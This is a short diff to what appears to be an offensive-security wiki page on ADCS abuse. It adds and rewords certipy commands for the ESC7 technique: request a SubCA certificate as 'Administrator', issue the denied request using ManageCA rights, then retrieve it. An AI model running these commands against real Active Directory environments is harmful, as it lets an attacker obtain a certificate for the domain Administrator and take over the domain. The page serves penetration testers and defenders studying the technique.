@@ -196,10 +196,13 @@ certipy ca -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" -ca 'ca_name' -enab
 In order to abuse the `SubCA` template with ESC7, both `ManageCA` and `ManageCertificates` are needed in order to issue a certificate from a failed request.
 
 ```bash
-# Issue a failed request (need ManageCA and ManageCertificates rights for a failed request)
+# Request a certificates for SubCA (it will fail with CERTSRV_E_TEMPLATE_DENIED)
+certipy req -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" -target "$ADCS_HOST" -ca 'ca_name' -template 'SubCA' -upn 'Administrator'
+
+# Issue the previous SubCA failed certificate request (need ManageCA and ManageCertificates rights for a failed request)
 certipy ca -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" -target "$ADCS_HOST" -ca 'ca_name' -issue-request 100
 
-# Retrieve an issued certificate
+# Retrieve the issued certificate
 certipy req -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" -target "$ADCS_HOST" -ca 'ca_name' -retrieve 100
 ```
 
